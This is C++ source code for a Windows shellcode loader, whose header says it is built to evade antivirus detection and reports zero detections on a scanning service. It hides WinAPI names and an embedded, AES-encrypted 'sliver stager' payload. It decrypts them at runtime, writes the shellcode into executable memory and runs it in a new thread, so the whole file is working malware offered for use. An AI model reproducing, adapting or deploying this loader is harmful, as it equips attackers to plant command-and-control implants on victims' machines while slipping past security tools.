/*
  A shellcode loader that uses function pointers to WinAPI to evade suspicious API call flagging, and AES decryptor to decrypt all encrypted strings
  to evade static detection.
  Inspired from Sektor7's "Malware Essentials Course"
  As of today, it has 0/26 detections at antiscan.me
  
  By s4nsec
*/
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int Decr_this_chunk(BYTE* payload, DWORD payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

static wchar_t* charToWChar(const char* text)
{
	const size_t size = strlen(text) + 1;
	wchar_t* wText = new wchar_t[size];
	mbstowcs(wText, text, size);
	return wText;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
	typedef LPVOID(WINAPI* pVirtualAlloc)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
		);

	typedef VOID(WINAPI* pRtlMoveMemory)(
		VOID UNALIGNED* Destination,
		VOID UNALIGNED* Source,
		SIZE_T         Length
		);

	typedef BOOL(WINAPI* pVirtualProtect)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flNewProtect,
		PDWORD lpflOldProtect
		);

	typedef HANDLE(WINAPI* pCreateThread)(
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		SIZE_T dwStackSize,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		DWORD dwCreationFlags,
		LPDWORD lpThreadId
		);

	typedef DWORD(WINAPI* pWaitForSingleObject)(
		HANDLE hHandle,
		DWORD  dwMilliseconds
		);

	typedef void (WINAPI *pSleep)(
		DWORD dwMilliseconds
	);
	// obf ds
	char sKernel32key[] = { 0xd1, 0xf6, 0x84, 0xd0, 0x4c, 0xd, 0x10, 0x2c, 0xea, 0x1a, 0xbc, 0xa2, 0x27, 0x73, 0xc7, 0x7b };
	char sKernel32[] = { 0xbe, 0x82, 0x71, 0x85, 0xe6, 0x1e, 0x8a, 0x32, 0xa0, 0x39, 0xde, 0x32, 0x6b, 0x8c, 0xc5, 0xb2 };

	char sNtdllkey[] = { 0x42, 0xfa, 0x3d, 0x62, 0x1a, 0xdb, 0x87, 0x60, 0x4c, 0xb4, 0xd1, 0x5f, 0xc0, 0x6c, 0x2d, 0x25 };
	char sNtdll[] = { 0x9f, 0x48, 0x70, 0x66, 0x3e, 0xe9, 0x8c, 0x49, 0x2d, 0x29, 0x5f, 0x1b, 0x91, 0xf4, 0x31, 0x5b };

	// obf pl
	// sliver payload and key
	//char sCalcKey[] = { 0x39, 0x72, 0x3, 0xfd, 0xbd, 0xf2, 0x91, 0x8b, 0xe7, 0xac, 0x42, 0x98, 0x2e, 0x4b, 0xbd, 0x39 };
	//char sCalc[] = { 0x8f, 0xfe, 0xc2, 0xf8, 0x11, 0x33, 0x5f, 0xc3, 0xe5, 0x37, 0xfe, 0xdf, 0x7, 0x0, 0xb2, 0xc4, 0x2d, 0x2a, 0x96, 0xfa, 0xeb, 0xce, 0x6b, 0x23, 0x83, 0x9e, 0x6d, 0x3e, 0x29, 0xd, 0x1e, 0x5e, 0xba, 0x14, 0x9b, 0xdd, 0xcd, 0xaa, 0x38, 0x52, 0xd4, 0xeb, 0x5, 0x20, 0x64, 0x35, 0xe5, 0x28, 0x87, 0xd, 0x57, 0xc5, 0xfe, 0x25, 0x53, 0xd, 0xb1, 0x1e, 0x96, 0x56, 0x6b, 0x68, 0xe9, 0xec, 0xb2, 0x30, 0xf5, 0x4a, 0xdf, 0xec, 0x7d, 0xdc, 0x7c, 0x30, 0xc3, 0x3d, 0x24, 0x15, 0xad, 0xeb, 0x9, 0x4b, 0xab, 0xcd, 0x17, 0x6d, 0x7f, 0x9, 0x6c, 0x18, 0x7f, 0xb8, 0x0, 0xb8, 0x61, 0x8f, 0x35, 0xef, 0x1c, 0x64, 0xf0, 0x2b, 0x57, 0x37, 0xca, 0xe5, 0xfd, 0x70, 0x39, 0x52, 0x16, 0x67, 0xe7, 0x6e, 0xc6, 0xef, 0xaf, 0xaa, 0x8a, 0x7e, 0x0, 0xee, 0x15, 0xcb, 0xc8, 0x64, 0x64, 0x7f, 0xd8, 0x93, 0x7c, 0xa8, 0x52, 0xb, 0x40, 0xdd, 0x2d, 0x7d, 0xad, 0x7e, 0xfc, 0x96, 0x2, 0x92, 0xd9, 0x79, 0x70, 0xfd, 0x28, 0x4, 0x61, 0x93, 0x8, 0x41, 0xb1, 0x1a, 0x6e, 0x13, 0x44, 0xd8, 0x54, 0x1, 0xd1, 0xe, 0xf1, 0x82, 0x2f, 0x1d, 0x6d, 0x7f, 0xe5, 0x57, 0xf6, 0xda, 0xa9, 0x59, 0x32, 0xd4, 0x9c, 0x63, 0x56, 0x64, 0xb5, 0x1a, 0xc4, 0x18, 0x97, 0x81, 0xed, 0x51, 0xba, 0x71, 0xd0, 0xee, 0xf8, 0x3, 0x7c, 0x45, 0x36, 0x22, 0x7e, 0xf5, 0xb6, 0x1c, 0xbf, 0x4e, 0xf8, 0x6d, 0x8b, 0xdf, 0xc2, 0xf7, 0xef, 0xbb, 0xa5, 0xd, 0xc2, 0x3e, 0x1, 0xda, 0x72, 0x82, 0xad, 0x61, 0xdd, 0x81, 0xc0, 0x72, 0xf, 0xf7, 0xd9, 0x3d, 0x84, 0xb6, 0xb, 0xb4, 0x9b, 0xaa, 0xf0, 0xbb, 0x14, 0x10, 0x5f, 0x64, 0xa7, 0x21, 0x68, 0x26, 0x88, 0xfa, 0x40, 0xa2, 0x56, 0xf6, 0xc0, 0xc0, 0xe1, 0xe7, 0x1a, 0x1d, 0xa2, 0xd4, 0x8, 0x75, 0x13, 0xdd, 0x19, 0x3f, 0xf2, 0x19, 0xa6, 0x5, 0xd2, 0x4b, 0xae, 0x5e, 0xfb, 0xba, 0xdb, 0xa4, 0xd6, 0xad, 0x9f, 0x4c, 0xcf, 0x6a, 0x46, 0x6e, 0x9, 0xb4, 0x88, 0xba, 0xfa, 0x29, 0x1e, 0x26, 0x83, 0x7, 0x42, 0x31, 0x29, 0xa7, 0x60, 0xf9, 0x80, 0x6c, 0x82, 0x66, 0xa3, 0x1c, 0x31, 0xf9, 0xf9, 0x85, 0x66, 0x44, 0x91, 0x59, 0x77, 0xaf, 0xba, 0xbe, 0x19, 0xe7, 0xe6, 0xba, 0x62, 0xc0, 0xc9, 0x8d, 0x99, 0x43, 0x9d, 0xbf, 0x20, 0x23, 0x60, 0xb3, 0x7a, 0xdc, 0x32, 0x63, 0x6, 0x92, 0xc0, 0x47, 0xee, 0x16, 0xa3, 0xc0, 0x96, 0x35, 0x0, 0x28, 0x92, 0x81, 0xbd, 0x6a, 0xda, 0xca, 0x77, 0xdd, 0x82, 0x4a, 0xb7, 0xb0, 0x2b, 0x23, 0x2, 0xf, 0x33, 0x80, 0x7b, 0xb6, 0xb0, 0xdd, 0x5c, 0xcf, 0x91, 0x8, 0x3d, 0xf4, 0x2d, 0xb6, 0x49, 0x39, 0x14, 0xf3, 0xd0, 0x60, 0x34, 0xfa, 0x79, 0x26, 0x6, 0x9a, 0xd9, 0xc2, 0xdd, 0x64, 0x86, 0x47, 0xd7, 0xdd, 0x8, 0xe, 0x27, 0x57, 0xb3, 0x81, 0x66, 0xd4, 0xd1, 0xe4, 0x9f, 0xad, 0xd6, 0x81, 0xd5, 0x98, 0x8d, 0xd9, 0x48, 0x93, 0xcf, 0xd5, 0xc8, 0x1f, 0xfa, 0x5e, 0x5a, 0x11, 0x3a, 0xa4, 0x76, 0x50, 0x5c, 0x74, 0x7d, 0x9, 0x64, 0xcf, 0x9d, 0x52, 0x88, 0x6d, 0xf8, 0xb2, 0xd, 0xd2, 0xc, 0xe4, 0xbd, 0x9f, 0xab, 0x85, 0x69, 0x37, 0xee, 0x93, 0x85, 0x4c, 0x36, 0x1b, 0x88, 0x90, 0x48, 0x3d, 0xfd, 0x47, 0x5e, 0x32, 0x73, 0xa8, 0xda, 0x8e, 0xcf, 0xa3, 0x90, 0xea, 0xc0, 0xc2, 0xfc, 0x2f, 0x8f, 0xe6, 0xa1, 0x2d, 0x44, 0x9e, 0x26, 0xf7, 0x47, 0x70, 0xe1, 0x66, 0xe, 0x9e, 0xea, 0x93, 0xf7, 0x9c, 0xc, 0xff, 0x19, 0x93, 0x6f, 0x27, 0x94, 0xb6, 0xd3, 0x53, 0xa6, 0x94, 0x12, 0x46, 0xcf, 0x88, 0xe, 0x51, 0x95, 0xfe, 0x6e, 0xd0, 0x3, 0xa9, 0x65, 0xd3, 0xd5, 0xc4, 0x6d, 0x82, 0x25, 0x40, 0xfa, 0xca, 0xf6, 0xda, 0xe6, 0x9b, 0x91, 0xfc, 0x40, 0x0, 0x1, 0x4e, 0x81, 0x2f, 0xa5, 0xc4, 0xff, 0xca, 0x50, 0xab, 0x6, 0xa8, 0xa2, 0x8c, 0x5e, 0x65, 0xa8, 0x4b, 0xc8, 0xaa, 0x24, 0x7a, 0x67, 0x73, 0xb9, 0xb2, 0x2e, 0x9d, 0x52, 0xd4, 0x90, 0xb0, 0xc7, 0xcf, 0x99, 0x76, 0x51, 0xa9, 0x51, 0x13, 0x6c, 0x3, 0x83, 0x49, 0x56, 0xb9, 0x8f, 0x11, 0x43, 0xbe, 0x2, 0x66, 0x85, 0x49, 0xfc, 0x0, 0x5f, 0xed, 0x96, 0x74, 0xed, 0x54, 0x10, 0x35, 0xec, 0x44, 0x61, 0x65, 0xc9, 0x3d, 0xd5, 0x95, 0x6c, 0x5a, 0x42, 0x60, 0xfa, 0x3, 0x6f, 0xfd, 0xee, 0x19, 0x96, 0x65, 0xcf, 0x97, 0x8f, 0xa2, 0x8e, 0xc4, 0x1e, 0xde, 0xfd, 0xba, 0x47, 0x71, 0xb7, 0x12, 0xa5, 0xc3, 0xb4, 0xbd, 0xd6, 0x1a, 0xa9, 0x6c, 0x93, 0xb6, 0x9a, 0x55, 0x46, 0xa8, 0xd8, 0x6, 0x10, 0x88, 0x5a, 0xbb, 0xd4, 0x8f, 0x22, 0xb, 0x42, 0x53, 0x3, 0x57, 0x5, 0xdd, 0xb2, 0xf4, 0x1, 0x5d, 0x19, 0xf1, 0xc1, 0x75, 0xd, 0x9b, 0xd8, 0xf6, 0x61, 0xd9, 0xaa, 0xb3, 0xb2, 0x45, 0x33, 0x8e, 0x26, 0x18, 0xf0, 0xc3, 0x77, 0x5d, 0xb8, 0x85, 0x7f, 0x7a, 0xd6, 0x9e, 0xc4, 0x23, 0x44, 0xc0, 0x90, 0x25, 0x72, 0x15, 0x8d, 0xfb, 0x91, 0x93, 0x46, 0x5a, 0xc9, 0x4d, 0xda, 0x29, 0x70, 0xca, 0x50, 0xe2, 0x2d, 0xa6, 0xfd, 0x49, 0x85, 0xef, 0xb2, 0x56, 0xc1, 0xd8, 0x6b, 0xe7, 0x8, 0x8b, 0xce, 0x2c, 0x44, 0x86, 0x63, 0xee, 0x16, 0x2b, 0xb0, 0xc5, 0xc2, 0xde, 0x69, 0x4c, 0x3d, 0x11, 0xa4, 0xe8, 0xca, 0x68, 0x98, 0x56, 0x81, 0x81, 0x28, 0x2b, 0xc0, 0x67, 0x52, 0x53, 0xc0, 0x2f, 0xee, 0x9e, 0x34, 0x39, 0x91, 0x8a, 0x48, 0x74, 0x79, 0x93, 0x85, 0x98, 0x90, 0x9e, 0x23, 0xe6, 0xa9, 0xdd, 0x30, 0x31, 0x6, 0x8b, 0xa4, 0x66, 0xfe, 0x4, 0x6b, 0x15, 0x6d, 0xcf, 0xbb, 0xa8, 0x75, 0x66, 0x25, 0x4c, 0x35, 0x2f, 0xd8, 0xe, 0xf4, 0x1b, 0x2b, 0x0, 0xae, 0x8a, 0xe, 0x5e, 0xb, 0x37, 0x34, 0x24, 0xd5, 0xef, 0xb1, 0xaf, 0xbe, 0x51, 0x76, 0x3c, 0xc4, 0x1c, 0xc3, 0x66, 0x3, 0xbe, 0xa4, 0xf6, 0x69, 0x37, 0x6, 0xa6, 0x58, 0x41, 0xba, 0x22, 0xc0, 0xde, 0x82, 0xad, 0x76, 0x97, 0x38, 0x41, 0xdd, 0xfe, 0xed, 0x68, 0x90, 0x1f, 0x27, 0xa7, 0xd6, 0x9a, 0xb1, 0x5c, 0xd4, 0x92, 0x39, 0xbf, 0x27, 0xb6, 0xcc, 0xa0, 0x82, 0xfc, 0x76, 0xd1, 0xd1, 0xc1, 0x78, 0x73, 0x34, 0x3, 0xc1, 0xbd, 0x11, 0x79, 0x28, 0x37, 0x9c, 0x94, 0x3f, 0x6e };


	//sliver stager payload and key
	char sCalcKey[] = { 0x7, 0x81, 0xce, 0x2d, 0x85, 0x36, 0xe7, 0x9a, 0x3d, 0x27, 0x8f, 0x66, 0x2d, 0x3d, 0xb3, 0xb9 };
	char sCalc[] = { 0x83, 0x6d, 0x35, 0xf7, 0x77, 0xb, 0x48, 0xb, 0x4, 0xab, 0x6e, 0xd0, 0x64, 0x6b, 0x2, 0xad, 0xf3, 0x20, 0x7c, 0xc6, 0xa3, 0x7b, 0x2d, 0xc1, 0x7e, 0x16, 0xd3, 0x4f, 0xac, 0xf1, 0x37, 0x1d, 0xa, 0x22, 0x10, 0xf4, 0x90, 0x5, 0x33, 0xfe, 0x8d, 0xbe, 0x8c, 0x1b, 0x1d, 0x1b, 0x49, 0x80, 0x32, 0xa9, 0x7, 0xf5, 0xad, 0xd8, 0x76, 0xcd, 0x19, 0x42, 0x9e, 0x25, 0x83, 0xbb, 0x98, 0x72, 0x4c, 0xaf, 0x97, 0xd, 0xb3, 0x28, 0xf6, 0x85, 0x3a, 0x96, 0x70, 0x80, 0x42, 0x3c, 0x70, 0x92, 0xd0, 0x31, 0x8c, 0x63, 0x67, 0x84, 0x3e, 0x82, 0xa7, 0xdf, 0x67, 0x86, 0xf4, 0x8d, 0xb0, 0x10, 0x4f, 0x9f, 0xfa, 0xac, 0xfd, 0x34, 0x9f, 0x58, 0x45, 0x4d, 0xf7, 0x80, 0x80, 0x7c, 0xa5, 0x92, 0xc1, 0x88, 0xa, 0xae, 0x1f, 0x2f, 0xda, 0xb2, 0xb2, 0xb6, 0xba, 0x24, 0xc0, 0x9c, 0x1f, 0x15, 0x8c, 0xba, 0xf0, 0x58, 0x2d, 0x8a, 0xb2, 0x2f, 0xc1, 0xc6, 0x24, 0xa4, 0x19, 0xf6, 0xb3, 0xa7, 0x4f, 0xf4, 0x22, 0xb5, 0x14, 0x6, 0x12, 0x83, 0x7e, 0x58, 0x1c, 0xf6, 0xce, 0xf1, 0x5d, 0x4e, 0x60, 0x3d, 0x64, 0x65, 0x49, 0x8c, 0x8f, 0xc1, 0x2, 0x44, 0x33, 0x6c, 0x20, 0x23, 0x71, 0x89, 0x9c, 0x7a, 0x17, 0x47, 0x3f, 0xca, 0x5c, 0x54, 0xc1, 0xd7, 0x0, 0x71, 0x6d, 0x24, 0x9c, 0xb8, 0x88, 0x73, 0x8e, 0x95, 0x21, 0x9, 0x87, 0xd5, 0x1b, 0x1d, 0xb1, 0xf3, 0xe0, 0xd6, 0x94, 0xa9, 0x53, 0xd4, 0x80, 0xc4, 0x2, 0x96, 0xa1, 0x43, 0x30, 0xa0, 0xc8, 0xe4, 0x72, 0x8f, 0x20, 0x5, 0x67, 0x5d, 0x79, 0xe7, 0xba, 0xfa, 0xbd, 0x68, 0x23, 0x32, 0x81, 0x2b, 0x57, 0xfb, 0xd2, 0x85, 0x8c, 0xb5, 0x9a, 0x54, 0xc3, 0xaa, 0xf2, 0x3d, 0x6e, 0x19, 0x52, 0xb8, 0x76, 0x66, 0x8a, 0xd4, 0x14, 0xa2, 0xe1, 0x4d, 0x9e, 0x4e, 0xc0, 0x32, 0x80, 0xf4, 0x15, 0xa6, 0x64, 0x16, 0xef, 0x89, 0x8e, 0xce, 0x3, 0x99, 0xfd, 0x67, 0x7c, 0x87, 0x50, 0xfc, 0xf8, 0xcc, 0x3b, 0xa7, 0x18, 0xe3, 0x5c, 0x82, 0xd3, 0x41, 0x7c, 0xe0, 0x3e, 0xde, 0x53, 0xd, 0x79, 0x9d, 0xf1, 0xb7, 0x2a, 0xa2, 0xdf, 0xa9, 0x19, 0x83, 0x4f, 0xda, 0x11, 0x48, 0x7e, 0x13, 0xb3, 0x4c, 0x9c, 0xdb, 0xb9, 0x1b, 0x9e, 0x7e, 0x37, 0xd7, 0x73, 0x2c, 0x63, 0xe1, 0xc2, 0xc, 0xe3, 0x52, 0x8a, 0x4d, 0xbb, 0x50, 0x2, 0xf9, 0x79, 0x8d, 0x88, 0xb9, 0x87, 0x8f, 0x30, 0xe4, 0xb, 0xda, 0x44, 0x58, 0xa9, 0xef, 0xfe, 0xd7, 0x73, 0x79, 0xce, 0x7c, 0x31, 0x53, 0x3e, 0x8c, 0x8d, 0x84, 0x96, 0x2, 0xd4, 0x6c, 0xb4, 0x48, 0x1, 0x2e, 0x70, 0x55, 0x9d, 0x1b, 0xae, 0x41, 0xc3, 0xb7, 0x1b, 0x65, 0x1d, 0xc4, 0xdb, 0xb, 0xb6, 0x98, 0xa4, 0x5b, 0xdc, 0x71, 0xbd, 0xd5, 0xec, 0x9a, 0x21, 0x5c, 0xfa, 0x95, 0x11, 0xc6, 0x8a, 0x33, 0x49, 0x99, 0xbd, 0xb4, 0x8, 0x79, 0x95, 0xda, 0x66, 0xfd, 0xd4, 0xe4, 0x43, 0xb8, 0x28, 0x38, 0x47, 0xfc, 0xdc, 0x1, 0x6c, 0xb7, 0xad, 0x14, 0xe2, 0x68, 0x6, 0x94, 0x33, 0xb, 0xb7, 0x2d, 0x39, 0xaf, 0x0, 0x5b, 0x2f, 0xd1, 0x4b, 0xc0, 0x10, 0x90, 0x23, 0x88, 0x37, 0x57, 0x4c, 0x4b, 0x65, 0x36, 0x13, 0xf3, 0x1d, 0xa0, 0xc4, 0x9f, 0x94, 0x95, 0x92, 0x2a, 0xcf, 0xcc, 0xaa, 0x7d, 0xb5, 0x22, 0xd, 0x33, 0x76, 0x36, 0xc6, 0xd5, 0x8e, 0x8b, 0x28, 0x5f, 0xf1, 0x32, 0xe0, 0x44, 0xf2, 0xfa, 0x17, 0x58, 0xa8, 0xaf, 0x26, 0xe, 0xd1, 0x99, 0xde, 0x6b, 0x12, 0xf7, 0x98, 0x62, 0x3e, 0xb3, 0x3c, 0x8b, 0x52, 0xb9, 0x95, 0x6d, 0xdf, 0x49, 0x96, 0x9 };

	// obf fcalls
	char sVirtualAllocKey[] = { 0x3b, 0x1d, 0x51, 0x79, 0x4f, 0xf8, 0x4c, 0xed, 0xde, 0x4, 0x82, 0x5c, 0x1b, 0xcb, 0x2, 0xaf };
	char sVirtualAlloc[] = { 0xeb, 0x86, 0xd, 0xed, 0xa0, 0xd4, 0xc1, 0x22, 0x25, 0xd8, 0xe9, 0x2a, 0x85, 0x61, 0xed, 0xdc };

	char sRtlMoveMemoryKey[] = { 0xba, 0x3b, 0x8c, 0xe, 0x3e, 0xe4, 0x8e, 0xc6, 0x9b, 0xb7, 0xd4, 0x3, 0x1d, 0xeb, 0x70, 0xc3 };
	char sRtlMoveMemory[] = { 0x73, 0x97, 0x4d, 0xe9, 0xbd, 0x31, 0x14, 0xb, 0x70, 0x54, 0xc4, 0x1b, 0x1e, 0xc8, 0x20, 0x14 };

	char sVirtualProtectKey[] = { 0x31, 0xc4, 0xa6, 0xb, 0x68, 0x45, 0xc4, 0xc3, 0xf3, 0x98, 0xef, 0x77, 0x5a, 0x23, 0x0, 0x13 };
	char sVirtualProtect[] = { 0xf7, 0x2f, 0xe3, 0x2e, 0x55, 0x41, 0xbd, 0x50, 0x9e, 0x5d, 0x2e, 0xf5, 0x70, 0x49, 0x5, 0xaf, 0xe3, 0xb4, 0x1f, 0xe0, 0xf2, 0xae, 0x56, 0xe, 0xff, 0xdc, 0xf1, 0xe2, 0xc0, 0x8d, 0x50, 0xba };

	char sCreateThreadKey[] = { 0x30, 0xb3, 0x2c, 0x7, 0x70, 0xa1, 0xcd, 0xf7, 0x28, 0xc2, 0x80, 0xba, 0xe0, 0x64, 0x2c, 0x76 };
	char sCreateThread[] = { 0xb2, 0x5a, 0x9f, 0xab, 0xa4, 0x47, 0xad, 0x55, 0x5, 0x9a, 0xdd, 0xd8, 0xb3, 0xe6, 0xec, 0xae };

	char sWaitForSingleObjectKey[] = { 0xf5, 0xdc, 0xe9, 0xd3, 0xf, 0xc0, 0x13, 0x61, 0xdc, 0x95, 0xab, 0xf4, 0xc5, 0xbd, 0x7c, 0x9 };
	char sWaitForSingleObject[] = { 0x64, 0x33, 0x7e, 0x37, 0x5c, 0x9c, 0x80, 0x8b, 0xae, 0x6, 0x5, 0xdd, 0x5a, 0xc5, 0x25, 0xeb, 0x72, 0x93, 0x66, 0xb1, 0x91, 0xbd, 0xa, 0xe1, 0x25, 0x5e, 0x7, 0x7f, 0xd2, 0xfd, 0x58, 0xce };


	void * mem_exec;
	DWORD mem_old;
	DWORD res_vp;
	HANDLE ht;

	Decr_this_chunk((BYTE*)sKernel32, sizeof(sKernel32), (char*)sKernel32key, sizeof(sKernel32key));
	Decr_this_chunk((BYTE*)sVirtualAlloc, sizeof(sVirtualAlloc), sVirtualAllocKey, sizeof(sVirtualAllocKey));
	
	pVirtualAlloc va = (pVirtualAlloc)GetProcAddress(GetModuleHandleW(charToWChar(sKernel32)), sVirtualAlloc);

	Decr_this_chunk((BYTE*)sNtdll, sizeof(sNtdll), (char*)sNtdllkey, sizeof(sNtdllkey));
	Decr_this_chunk((BYTE*)sRtlMoveMemory, sizeof(sRtlMoveMemory), sRtlMoveMemoryKey, sizeof(sRtlMoveMemoryKey));
	pRtlMoveMemory rm = (pRtlMoveMemory)GetProcAddress(GetModuleHandleW(charToWChar(sNtdll)), sRtlMoveMemory);

	Decr_this_chunk((BYTE*)sVirtualProtect, sizeof(sVirtualProtect), sVirtualProtectKey, sizeof(sVirtualProtectKey));
	pVirtualProtect vp = (pVirtualProtect)GetProcAddress(GetModuleHandleW(charToWChar(sKernel32)), sVirtualProtect);

	Decr_this_chunk((BYTE*)sCreateThread, sizeof(sCreateThread), sCreateThreadKey, sizeof(sCreateThreadKey));
	pCreateThread ct = (pCreateThread)GetProcAddress(GetModuleHandleW(charToWChar(sKernel32)), sCreateThread);

	Decr_this_chunk((BYTE*)sWaitForSingleObject, sizeof(sWaitForSingleObject), sWaitForSingleObjectKey, sizeof(sWaitForSingleObjectKey));
	pWaitForSingleObject wfs = (pWaitForSingleObject)GetProcAddress(GetModuleHandleW(charToWChar(sKernel32)), sWaitForSingleObject);



	Decr_this_chunk((BYTE*)sCalc, sizeof(sCalc), (char*)sCalcKey, sizeof(sCalcKey));
	
	
	mem_exec = va(0, sizeof(sCalc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	rm(mem_exec, sCalc, sizeof(sCalc));


	res_vp = vp(mem_exec, sizeof(sCalc), PAGE_EXECUTE_READ, &mem_old);
	
	if (res_vp != 0) {
		
		ht = ct(0, 0, (LPTHREAD_START_ROUTINE)mem_exec, 0, 0, 0);
		wfs(ht, -1);
	}
	



	return 0;
}
